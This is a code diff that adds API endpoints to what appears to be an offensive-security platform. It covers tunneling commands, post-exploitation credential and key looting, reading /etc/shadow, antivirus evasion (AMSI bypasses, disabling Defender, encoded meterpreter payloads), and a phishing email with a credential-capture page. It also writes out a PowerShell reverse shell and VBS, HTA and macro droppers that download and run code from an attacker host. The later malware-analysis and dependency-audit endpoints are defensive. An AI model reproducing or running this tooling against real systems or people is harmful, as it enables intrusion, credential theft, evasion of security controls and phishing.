+async def tunnel_chisel(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    lhost = opts.get("lhost", "10.10.10.10")
+    lport = opts.get("lport", 8080)
+    mode = opts.get("mode", "socks5")
+    if mode == "socks5":
+        server_cmd = f"chisel server -p {lport} --reverse --socks5"
+        client_cmd = f"chisel client {lhost}:{lport} R:socks"
+        socks_cmd = f"proxychains4 -f /etc/proxychains4.conf <command>"
+    else:
+        rport = opts.get("rport", 3389)
+        server_cmd = f"chisel server -p {lport} --reverse"
+        client_cmd = f"chisel client {lhost}:{lport} R:{rport}:127.0.0.1:{rport}"
+        socks_cmd = f"Connect to 127.0.0.1:{rport} on attacker"
+    findings = [
+        {"severity": "INFO", "title": "Chisel Server Command", "detail": server_cmd},
+        {"severity": "INFO", "title": "Chisel Client Command (run on victim)", "detail": client_cmd},
+        {"severity": "INFO", "title": "Usage", "detail": socks_cmd},
+    ]
+    return {"scan_id": scan_id, "target": lhost, "findings": findings,
+            "raw_output": f"{server_cmd}\n{client_cmd}\n{socks_cmd}",
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "Chisel commands generated"}
+
+
+@app.post("/api/tunnel/socat")
+async def tunnel_socat(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    lhost = opts.get("lhost", "0.0.0.0")
+    lport = opts.get("lport", 4444)
+    rhost = opts.get("rhost", req.target)
+    rport = opts.get("rport", 80)
+    relay_cmd = f"socat TCP-LISTEN:{lport},fork,reuseaddr TCP:{rhost}:{rport}"
+    tty_cmd = f"socat file:`tty`,raw,echo=0 TCP:{rhost}:{rport}"
+    pivot_cmd = f"socat TCP-LISTEN:{lport},fork TCP:{rhost}:{rport} &"
+    findings = [
+        {"severity": "INFO", "title": "Port Relay", "detail": relay_cmd},
+        {"severity": "INFO", "title": "TTY Upgrade", "detail": tty_cmd},
+        {"severity": "INFO", "title": "Pivot Relay (background)", "detail": pivot_cmd},
+    ]
+    raw = "\n".join([relay_cmd, tty_cmd, pivot_cmd])
+    return {"scan_id": scan_id, "target": rhost, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "Socat commands generated"}
+
+
+@app.post("/api/tunnel/ssh")
+async def tunnel_ssh(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    ttype = opts.get("type", "dynamic")
+    lport = opts.get("lport", 1080)
+    rhost = opts.get("rhost", req.target)
+    rport = opts.get("rport", 80)
+    user = opts.get("user", "user")
+    if ttype == "local":
+        cmd = f"ssh -L {lport}:{rhost}:{rport} {user}@{rhost} -N -f"
+        desc = f"Forward local port {lport} to {rhost}:{rport}"
+    elif ttype == "remote":
+        cmd = f"ssh -R {rport}:localhost:{lport} {user}@{rhost} -N -f"
+        desc = f"Expose local port {lport} on remote as {rport}"
+    else:
+        cmd = f"ssh -D {lport} {user}@{rhost} -N -f"
+        desc = f"SOCKS5 proxy on localhost:{lport}"
+    findings = [
+        {"severity": "INFO", "title": f"SSH {ttype.title()} Tunnel", "detail": cmd},
+        {"severity": "INFO", "title": "Explanation", "detail": desc},
+    ]
+    return {"scan_id": scan_id, "target": rhost, "findings": findings, "raw_output": cmd,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "SSH tunnel command generated"}
+
+
+@app.post("/api/tunnel/proxychains")
+async def tunnel_proxychains(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    proxy_type = opts.get("proxy_type", "socks5")
+    proxy_ip = opts.get("proxy_ip", "127.0.0.1")
+    proxy_port = opts.get("proxy_port", 1080)
+    conf_path = "/tmp/proxychains_gen.conf"
+    conf_content = (
+        "strict_chain\nproxy_dns\nremote_dns_subnet 224\ntcp_read_time_out 15000\n"
+        f"tcp_connect_time_out 8000\n[ProxyList]\n{proxy_type} {proxy_ip} {proxy_port}\n"
+    )
+    try:
+        with open(conf_path, "w") as f:
+            f.write(conf_content)
+        written = True
+    except Exception:
+        written = False
+    usage = f"proxychains4 -f {conf_path} nmap -sT -Pn <target>"
+    findings = [
+        {"severity": "INFO", "title": "Config Written" if written else "Config (not written)", "detail": conf_path},
+        {"severity": "INFO", "title": "Proxychains Config", "detail": conf_content.strip()},
+        {"severity": "INFO", "title": "Usage Example", "detail": usage},
+    ]
+    return {"scan_id": scan_id, "target": proxy_ip, "findings": findings, "raw_output": conf_content,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "Proxychains config generated"}
+
+
+@app.post("/api/tunnel/ligolo")
+async def tunnel_ligolo(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    lhost = opts.get("lhost", "10.10.10.10")
+    lport = opts.get("lport", 11601)
+    agent_cmd = f"./agent -connect {lhost}:{lport} -ignore-cert"
+    proxy_cmd = f"./proxy -selfcert -laddr 0.0.0.0:{lport}"
+    iface_setup = (
+        "# On proxy (attacker):\n"
+        "sudo ip tuntap add user $(whoami) mode tun ligolo\n"
+        "sudo ip link set ligolo up\n"
+        "# In ligolo console after agent connects:\n"
+        "session\ntunnel_start\n"
+        "# Add route to pivot network (e.g.):\n"
+        "sudo ip route add 192.168.1.0/24 dev ligolo"
+    )
+    findings = [
+        {"severity": "INFO", "title": "Ligolo Proxy (attacker)", "detail": proxy_cmd},
+        {"severity": "INFO", "title": "Ligolo Agent (victim)", "detail": agent_cmd},
+        {"severity": "INFO", "title": "Interface Setup", "detail": iface_setup},
+    ]
+    return {"scan_id": scan_id, "target": lhost, "findings": findings,
+            "raw_output": f"{proxy_cmd}\n{agent_cmd}\n{iface_setup}",
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "Ligolo-ng commands generated"}
+
+
+# ─────────────────────────────────────────────────────────────
+# POST EXPLOITATION
+# ─────────────────────────────────────────────────────────────
+
+@app.post("/api/post/hashdump")
+async def post_hashdump(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    result = await run_tool(
+        ["sh", "-c", "cat /etc/passwd; cat /etc/shadow 2>/dev/null; cat /etc/shadow- 2>/dev/null"],
+        timeout=15
+    )
+    raw = result["output"] + result.get("error","")
+    findings = []
+    for line in raw.splitlines():
+        parts = line.split(":")
+        if len(parts) < 2:
+            continue
+        user = parts[0]
+        pw_field = parts[1] if len(parts) > 1 else ""
+        has_hash = pw_field not in ("", "x", "*", "!", "!!", "locked")
+        if has_hash:
+            sev = "CRITICAL" if user in ("root", "admin", "sudo") else "HIGH"
+            findings.append({"severity": sev, "title": f"Hash for: {user}", "detail": line.strip()})
+        elif user and not user.startswith("#"):
+            findings.append({"severity": "INFO", "title": f"User: {user}", "detail": line.strip()})
+    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} entry(ies) parsed"}
+
+
+@app.post("/api/post/creds")
+async def post_creds(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    pattern = r"password\|passwd\|secret\|api_key\|token"
+    result = await run_tool(
+        ["sh", "-c",
+         f"grep -rl '{pattern}' /home /var/www /opt /etc/*.conf 2>/dev/null"],
+        timeout=30
+    )
+    raw = result["output"] + result.get("error","")
+    findings = []
+    for line in raw.splitlines():
+        line = line.strip()
+        if line:
+            ext = os.path.splitext(line)[-1].lower()
+            sev = "CRITICAL" if ext in (".env", ".conf") else "HIGH"
+            findings.append({"severity": sev, "title": "Credential File Found", "detail": line})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "No credential files found", "detail": raw[:300]})
+    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} file(s) with creds"}
+
+
+@app.post("/api/post/persistence_check")
+async def post_persistence_check(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    cmd = (
+        "crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null; "
+        "systemctl list-units --type=service --state=running 2>/dev/null | tail -30; "
+        "cat ~/.bashrc 2>/dev/null | grep -v '^#'; "
+        "cat /etc/rc.local 2>/dev/null; "
+        "find / -perm -4000 -newer /tmp -type f 2>/dev/null; "
+        "cat ~/.ssh/authorized_keys 2>/dev/null"
+    )
+    result = await run_tool(["sh", "-c", cmd], timeout=30)
+    raw = result["output"] + result.get("error","")
+    findings = []
+    for line in raw.splitlines():
+        ll = line.lower().strip()
+        if not ll:
+            continue
+        if "authorized_keys" in ll or "ssh-rsa" in ll or "ssh-ed25519" in ll:
+            findings.append({"severity": "CRITICAL", "title": "Authorized Key Present", "detail": line.strip()})
+        elif re.search(r'\*.*\*.*\*', ll):
+            findings.append({"severity": "HIGH", "title": "Cron Persistence", "detail": line.strip()})
+        elif ".service" in ll and "running" in ll:
+            findings.append({"severity": "MEDIUM", "title": "Running Service", "detail": line.strip()})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "Persistence check output", "detail": raw[:500]})
+    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} indicator(s)"}
+
+
+@app.post("/api/post/network_enum")
+async def post_network_enum(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    result = await run_tool(
+        ["sh", "-c", "ss -tulnp; ip route; arp -a; cat /etc/hosts"],
+        timeout=15
+    )
+    raw = result["output"] + result.get("error","")
+    findings = []
+    for line in raw.splitlines():
+        ll = line.strip()
+        if not ll or ll.startswith("#"):
+            continue
+        if re.search(r'LISTEN|ESTABLISHED', ll):
+            findings.append({"severity": "MEDIUM", "title": "Open Port / Connection", "detail": ll})
+        elif re.search(r'\d+\.\d+\.\d+\.\d+', ll) and ("via" in ll or "dev" in ll):
+            findings.append({"severity": "INFO", "title": "Route Entry", "detail": ll})
+        elif "arp" in ll.lower() or "(" in ll:
+            findings.append({"severity": "INFO", "title": "ARP Entry", "detail": ll})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "Network enum output", "detail": raw[:500]})
+    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} network entries"}
+
+
+@app.post("/api/post/loot")
+async def post_loot(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    cmd = (
+        "find /home /root -name 'id_rsa' -o -name '*.pem' -o -name '*.key' 2>/dev/null; "
+        "find /home /root -name '.gnupg' -type d 2>/dev/null; "
+        "find /home /root -name 'Login Data' -o -name 'key4.db' 2>/dev/null; "
+        "find /home /root -name '.git-credentials' 2>/dev/null; "
+        "find /home /root -name 'credentials' -path '*/.aws/*' 2>/dev/null; "
+        "find /home /root -name '*.kdbx' -o -name '*.1password' 2>/dev/null"
+    )
+    result = await run_tool(["sh", "-c", cmd], timeout=20)
+    raw = result["output"] + result.get("error","")
+    findings = []
+    loot_map = {
+        "id_rsa": ("CRITICAL", "SSH Private Key"),
+        ".pem": ("HIGH", "PEM Certificate/Key"),
+        ".key": ("HIGH", "Key File"),
+        ".gnupg": ("HIGH", "GPG Keyring"),
+        "Login Data": ("HIGH", "Browser Saved Passwords"),
+        "key4.db": ("HIGH", "Firefox Key Database"),
+        ".git-credentials": ("CRITICAL", "Git Credentials"),
+        "credentials": ("CRITICAL", "AWS Credentials"),
+        ".kdbx": ("CRITICAL", "KeePass Database"),
+    }
+    for line in raw.splitlines():
+        line = line.strip()
+        if not line:
+            continue
+        for key, (sev, title) in loot_map.items():
+            if key in line:
+                findings.append({"severity": sev, "title": title, "detail": line})
+                break
+        else:
+            findings.append({"severity": "INFO", "title": "Loot File", "detail": line})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "No loot found", "detail": raw[:300]})
+    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} loot file(s)"}
+
+
+# ─────────────────────────────────────────────────────────────
+# ANTIVIRUS EVASION
+# ─────────────────────────────────────────────────────────────
+
+@app.post("/api/av/check")
+async def av_check(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    result = await run_tool(
+        ["sh", "-c", "ps aux | grep -iE 'av|antivirus|defender|sentinel|crowdstrike|carbon|symantec|mcafee|eset'"],
+        timeout=10
+    )
+    raw = result["output"] + result.get("error","")
+    av_paths = ["/opt/sophos-av", "/opt/CrowdStrike", "/opt/carbonblack", "/etc/clamav"]
+    path_findings = [p for p in av_paths if os.path.exists(p)]
+    findings = []
+    for line in raw.splitlines():
+        ll = line.lower()
+        if "grep" in ll:
+            continue
+        if any(av in ll for av in ["defender", "sentinel", "crowdstrike", "carbon", "symantec", "mcafee"]):
+            findings.append({"severity": "CRITICAL", "title": "AV Process Detected", "detail": line.strip()})
+        elif "clamav" in ll or "clamscan" in ll:
+            findings.append({"severity": "HIGH", "title": "ClamAV Detected", "detail": line.strip()})
+    for p in path_findings:
+        findings.append({"severity": "HIGH", "title": "AV Installation Path", "detail": p})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "No AV detected", "detail": "No common AV processes or paths found"})
+    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} AV indicator(s)"}
+
+
+@app.post("/api/av/veil")
+async def av_veil(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    lhost = opts.get("lhost", "10.10.10.10")
+    lport = opts.get("lport", 4444)
+    os.makedirs("/tmp/veil_out", exist_ok=True)
+    r1 = await run_tool(["veil", "--list-payloads"], timeout=20)
+    r2 = await run_tool(
+        ["veil", "-t", "Evasion", "-p", "powershell/meterpreter/rev_tcp.py",
+         "--ip", str(lhost), "--port", str(lport), "--output-dir", "/tmp/veil_out"],
+        timeout=60
+    )
+    raw = r1["output"] + r1["error"] + "\n" + r2["output"] + r2["error"]
+    findings = []
+    for line in raw.splitlines():
+        ll = line.lower()
+        if "compiled" in ll or "generated" in ll or "output" in ll:
+            findings.append({"severity": "HIGH", "title": "Veil Payload Generated", "detail": line.strip()})
+        elif "payload" in ll and "/" in line:
+            findings.append({"severity": "MEDIUM", "title": "Payload Listed", "detail": line.strip()})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "Veil result", "detail": raw[:400]})
+    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "Veil run complete"}
+
+
+@app.post("/api/av/amsi_bypass")
+async def av_amsi_bypass(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    techniques = [
+        {
+            "severity": "CRITICAL", "title": "AMSI Patch (Memory)",
+            "detail": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
+        },
+        {
+            "severity": "CRITICAL", "title": "AMSI Disable Real-Time",
+            "detail": "Set-MpPreference -DisableRealtimeMonitoring $true"
+        },
+        {
+            "severity": "HIGH", "title": "AMSI Context Corruption",
+            "detail": "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$b=$a.GetField('amsiContext','NonPublic,Static');$c=$b.GetValue($null);[Runtime.InteropServices.Marshal]::WriteByte($c,0x16)"
+        },
+        {
+            "severity": "HIGH", "title": "Disable ScriptBlock Logging",
+            "detail": "Set-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 0"
+        },
+        {
+            "severity": "MEDIUM", "title": "AMSI Force Error via Reflection",
+            "detail": "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
+        },
+    ]
+    return {"scan_id": scan_id, "target": req.target, "findings": techniques,
+            "raw_output": "\n".join(t["detail"] for t in techniques),
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(techniques)} AMSI bypass techniques"}
+
+
+@app.post("/api/av/obfuscate")
+async def av_obfuscate(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    lhost = opts.get("lhost", "10.10.10.10")
+    lport = opts.get("lport", 4444)
+    out_path = "/tmp/payload_obf.exe"
+    result = await run_tool(
+        ["msfvenom", "-p", "windows/x64/meterpreter/reverse_tcp",
+         f"LHOST={lhost}", f"LPORT={lport}",
+         "-e", "x64/xor_dynamic", "-i", "3", "-f", "exe", "-o", out_path],
+        timeout=60
+    )
+    raw = result["output"] + result.get("error","")
+    file_size = os.path.getsize(out_path) if os.path.exists(out_path) else 0
+    findings = [
+        {"severity": "HIGH", "title": "Obfuscated Payload Generated", "detail": f"Path: {out_path}, Size: {file_size} bytes"},
+        {"severity": "INFO", "title": "Encoder Used", "detail": "x64/xor_dynamic x3 iterations"},
+    ]
+    if result.get("error",""):
+        findings.append({"severity": "MEDIUM", "title": "msfvenom stderr", "detail": result.get("error","")[:200]})
+    return {"scan_id": scan_id, "target": lhost, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(),
+            "message": f"Payload at {out_path} ({file_size} bytes)"}
+
+
+# ─────────────────────────────────────────────────────────────
+# SOCIAL ENGINEERING
+# ─────────────────────────────────────────────────────────────
+
+@app.post("/api/se/phishing")
+async def se_phishing(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    org_name = opts.get("org_name", "Target Corp")
+    lhost = opts.get("lhost", "10.10.10.10")
+    _parsed = urlparse(req.target if "://" in req.target else f"http://{req.target}")
+    _domain = _parsed.hostname or req.target
+    email_template = (
+        f"From: IT Support <noreply@{_domain}>\n"
+        f"Subject: Urgent: Password Reset Required — {org_name}\n\n"
+        f"Dear Employee,\n\nWe have detected unusual activity on your {org_name} account.\n"
+        f"Please verify your credentials immediately:\n\nhttp://{lhost}/login\n\n"
+        f"Failure to comply within 24 hours will result in account suspension.\n\n"
+        f"Regards,\n{org_name} IT Security Team"
+    )
+    landing_page = (
+        f"<!DOCTYPE html><html><head><title>{org_name} Login</title></head><body>"
+        f"<h2>{org_name} — Secure Login</h2>"
+        f"<form method='POST' action='http://{lhost}/capture'>"
+        f"<input name='username' placeholder='Username'><br>"
+        f"<input type='password' name='password' placeholder='Password'><br>"
+        f"<button type='submit'>Login</button></form></body></html>"
+    )
+    setup_commands = (
+        f"# Start credential capture server:\n"
+        f"python3 -m http.server 80 --directory /tmp/phish\n"
+        f"# Or use SET:\nsetoolkit"
+    )
+    findings = [
+        {"severity": "HIGH", "title": "Phishing Email Template", "detail": email_template[:300]},
+        {"severity": "HIGH", "title": "Landing Page HTML", "detail": landing_page[:300]},
+        {"severity": "INFO", "title": "Setup Commands", "detail": setup_commands},
+    ]
+    return {"scan_id": scan_id, "target": req.target, "findings": findings,
+            "raw_output": email_template + "\n---\n" + landing_page,
+            "timestamp": datetime.datetime.utcnow().isoformat(),
+            "message": "Phishing kit generated",
+            "email_template": email_template, "landing_page_html": landing_page,
+            "setup_commands": setup_commands}
+
+
+@app.post("/api/se/clone")
+async def se_clone(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    clone_dir = f"/tmp/clone_{scan_id[:8]}"
+    result = await run_tool(
+        ["wget", "--mirror", "--convert-links", "--no-check-certificate",
+         req.target, "-P", clone_dir],
+        timeout=60
+    )
+    raw = result["output"] + result.get("error","")
+    exists = os.path.isdir(clone_dir)
+    findings = [
+        {"severity": "INFO" if exists else "MEDIUM",
+         "title": "Clone " + ("Successful" if exists else "Failed"),
+         "detail": f"Output directory: {clone_dir}"},
+    ]
+    if exists:
+        try:
+            count = sum(len(files) for _, _, files in os.walk(clone_dir))
+            findings.append({"severity": "INFO", "title": "Files Cloned", "detail": f"{count} file(s) in {clone_dir}"})
+        except Exception:
+            pass
+    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"Clone at {clone_dir}"}
+
+
+@app.post("/api/se/set_launcher")
+async def se_set_launcher(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    lhost = opts.get("lhost", "10.10.10.10")
+    config = (
+        "# SET Credential Harvester Config\n"
+        "1  # Social Engineering Attacks\n"
+        "2  # Website Attack Vectors\n"
+        "3  # Credential Harvester Attack\n"
+        "2  # Site Cloner\n"
+        f"# Enter IP: {lhost}\n"
+        f"# Enter URL to clone: http://{req.target}\n"
+    )
+    commands = f"sudo setoolkit\n# Follow menu:\n{config}\n# Credentials saved to /var/www/harvester_*.txt"
+    findings = [
+        {"severity": "HIGH", "title": "SET Credential Harvester", "detail": config},
+        {"severity": "INFO", "title": "Launch Command", "detail": "sudo setoolkit"},
+        {"severity": "INFO", "title": "Output", "detail": "Credentials saved to /var/www/harvester_*.txt"},
+    ]
+    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": commands,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "SET config generated"}
+
+
+@app.post("/api/se/payload_delivery")
+async def se_payload_delivery(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    lhost = opts.get("lhost", "10.10.10.10")
+    lport = opts.get("lport", 4444)
+    method = opts.get("method", "ps1")
+    payloads = {
+        "hta": (
+            f'<html><head><script language="VBScript">\n'
+            f'Set o=CreateObject("WScript.Shell")\n'
+            f'o.Run "powershell -nop -w hidden -e <BASE64_PAYLOAD>",0\n'
+            f'</script></head></html>\n'
+            f'# Deliver: python3 -m http.server 80; send link to victim'
+        ),
+        "vbs": (
+            f'Set shell = CreateObject("WScript.Shell")\n'
+            f'shell.Run "powershell -c \\"IEX(New-Object Net.WebClient).DownloadString(\'http://{lhost}/shell.ps1\')\\"",0,False\n'
+            f'# Deliver via email attachment or USB'
+        ),
+        "ps1": (
+            f'$c=New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});\n'
+            f'$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};\n'
+            f'while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);\n'
+            f'$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+">";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}}\n'
+            f'# Deliver: IEX(New-Object Net.WebClient).DownloadString("http://{lhost}/shell.ps1")'
+        ),
+        "doc": (
+            f'Sub AutoOpen()\n'
+            f'    Shell "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\'http://{lhost}/shell.ps1\')"\n'
+            f'End Sub\n'
+            f'# Embed in DOCX: Developer > Macros > Insert above > Save as .docm'
+        ),
+    }
+    payload_code = payloads.get(method, payloads["ps1"])
+    findings = [
+        {"severity": "CRITICAL", "title": f"Payload ({method.upper()})", "detail": payload_code[:400]},
+        {"severity": "HIGH", "title": "Listener", "detail": f"nc -lvnp {lport}  OR  msfconsole -x 'use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run'"},
+    ]
+    return {"scan_id": scan_id, "target": lhost, "findings": findings, "raw_output": payload_code,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{method.upper()} payload generated"}
+
+
+# ─────────────────────────────────────────────────────────────
+# MALWARE ANALYSIS
+# ─────────────────────────────────────────────────────────────
+
+@app.post("/api/malware/static")
+async def malware_static(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    filepath = opts.get("filepath", req.target)
+    r1 = await run_tool(["file", filepath], timeout=10)
+    r2 = await run_tool(["sh", "-c", f"strings '{filepath}' | head -100"], timeout=15)
+    r3 = await run_tool(["sha256sum", filepath], timeout=10)
+    r4 = await run_tool(["objdump", "-f", filepath], timeout=10)
+    r5 = await run_tool(["binwalk", filepath], timeout=20)
+    raw = "\n".join([r1["output"], r2["output"], r3["output"], r4["output"], r5["output"]])
+    findings = []
+    ft = r1["output"].strip()
+    if ft:
+        findings.append({"severity": "INFO", "title": "File Type", "detail": ft})
+    sha = r3["output"].split()[0] if r3["output"].strip() else "N/A"
+    findings.append({"severity": "INFO", "title": "SHA256", "detail": sha})
+    for s in r2["output"].splitlines():
+        sl = s.lower()
+        if any(k in sl for k in ["http", "cmd", "powershell", "exec", "shell", "download"]):
+            findings.append({"severity": "HIGH", "title": "Suspicious String", "detail": s.strip()})
+    for line in r5["output"].splitlines():
+        if "executable" in line.lower() or "archive" in line.lower():
+            findings.append({"severity": "MEDIUM", "title": "Binwalk Match", "detail": line.strip()})
+    return {"scan_id": scan_id, "target": filepath, "findings": findings, "raw_output": raw[:3000],
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} static findings"}
+
+
+@app.post("/api/malware/yara")
+async def malware_yara(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    filepath = opts.get("filepath", req.target)
+    rules_path = opts.get("rules_path", "/usr/share/yara-rules/")
+    result = await run_tool(["yara", "-r", rules_path, filepath], timeout=60)
+    raw = result["output"] + result.get("error","")
+    findings = []
+    for line in raw.splitlines():
+        line = line.strip()
+        if line and not line.startswith("error"):
+            sev = "CRITICAL" if any(w in line.lower() for w in ["trojan", "rat", "ransom", "backdoor"]) else "HIGH"
+            findings.append({"severity": sev, "title": "YARA Match", "detail": line})
+        elif "error" in line.lower():
+            findings.append({"severity": "INFO", "title": "YARA Error", "detail": line})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "No YARA matches", "detail": raw[:300]})
+    return {"scan_id": scan_id, "target": filepath, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} YARA match(es)"}
+
+
+@app.post("/api/malware/hash_lookup")
+async def malware_hash_lookup(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    filepath = opts.get("filepath", req.target)
+    r_md5 = await run_tool(["md5sum", filepath], timeout=10)
+    r_sha1 = await run_tool(["sha1sum", filepath], timeout=10)
+    r_sha256 = await run_tool(["sha256sum", filepath], timeout=10)
+    md5 = r_md5["output"].split()[0] if r_md5["output"].strip() else "N/A"
+    sha1 = r_sha1["output"].split()[0] if r_sha1["output"].strip() else "N/A"
+    sha256 = r_sha256["output"].split()[0] if r_sha256["output"].strip() else "N/A"
+    vt_url = f"https://www.virustotal.com/gui/file/{sha256}"
+    findings = [
+        {"severity": "INFO", "title": "MD5", "detail": md5},
+        {"severity": "INFO", "title": "SHA1", "detail": sha1},
+        {"severity": "INFO", "title": "SHA256", "detail": sha256},
+        {"severity": "INFO", "title": "VirusTotal Lookup URL", "detail": vt_url},
+    ]
+    raw = f"MD5: {md5}\nSHA1: {sha1}\nSHA256: {sha256}\nVT: {vt_url}"
+    return {"scan_id": scan_id, "target": filepath, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "Hashes computed"}
+
+
+@app.post("/api/malware/strings")
+async def malware_strings(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    filepath = opts.get("filepath", req.target)
+    result = await run_tool(
+        ["sh", "-c",
+         f"strings -n 6 '{filepath}' | grep -iE 'http|ftp|password|key|secret|cmd|powershell|base64|eval'"],
+        timeout=30
+    )
+    raw = result["output"] + result.get("error","")
+    findings = []
+    for line in raw.splitlines():
+        ll = line.lower()
+        if any(k in ll for k in ["password", "secret", "key", "base64", "eval"]):
+            findings.append({"severity": "HIGH", "title": "Sensitive String", "detail": line.strip()})
+        elif any(k in ll for k in ["http", "ftp", "cmd", "powershell"]):
+            findings.append({"severity": "MEDIUM", "title": "Network/Exec String", "detail": line.strip()})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "No suspicious strings", "detail": raw[:300]})
+    return {"scan_id": scan_id, "target": filepath, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} suspicious string(s)"}
+
+
+# ─────────────────────────────────────────────────────────────
+# SUPPLY CHAIN
+# ─────────────────────────────────────────────────────────────
+
+@app.post("/api/supply/npm_audit")
+async def supply_npm_audit(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    path = opts.get("path", req.target)
+    audit_type = opts.get("type", "npm")
+    if audit_type == "npm":
+        result = await run_tool(["npm", "audit", "--json"], timeout=60)
+    else:
+        result = await run_tool(["pip-audit", "--format", "json", "--path", path], timeout=60)
+    raw = result["output"] + result.get("error","")
+    findings = []
+    try:
+        data = json.loads(result["output"])
+        vulns = data.get("vulnerabilities", data.get("vulnerabilities", {}))
+        if isinstance(vulns, dict):
+            for name, info in vulns.items():
+                sev = info.get("severity", "MEDIUM").upper()
+                findings.append({"severity": sev, "title": f"Vulnerable Package: {name}",
+                                 "detail": str(info.get("via", info))[:200]})
+        elif isinstance(vulns, list):
+            for v in vulns:
